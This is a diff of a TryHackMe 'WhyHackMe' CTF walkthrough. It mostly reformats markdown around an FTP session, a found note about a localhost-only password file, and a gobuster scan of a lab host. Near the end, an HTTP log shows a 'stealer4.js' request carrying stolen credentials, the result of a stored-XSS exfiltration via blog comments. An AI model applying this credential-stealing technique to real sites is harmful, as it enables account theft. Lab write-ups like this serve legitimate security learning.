@@ -74,19 +74,14 @@ ftp> ls
 226 Directory send OK.
 ftp> exit
 421 Timeout.
-</code>                                                                                                                                       
 
-<b>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]<br>
-└─$ ls</b><br>
-nmap  update.txt
-                                                                                                                                                                                                                             <code>              
 <B>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]<br>
 └─$ cat update.txt  </B>
 
 >Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
 
-**┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]
-└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.134.235 -x .php,.ht**
+┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.134.235 -x .php,.ht
 >===============================================================
 Gobuster v3.1.0
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -111,7 +106,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /logout.php           (Status: 302) [Size: 0] [--> login.php]                     
 /config.php           (Status: 200) [Size: 0]                                     
 /server-status        (Status: 403) [Size: 278] 
-</code>
+---
 
 <h1> web service testing <\h1>
 
@@ -124,3 +119,4 @@ call script by adding comments on blog page
 log from http server
 10.10.240.147 - - [11/Jan/2024 03:53:19] "GET /stealer4.js?jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
 
+</code>
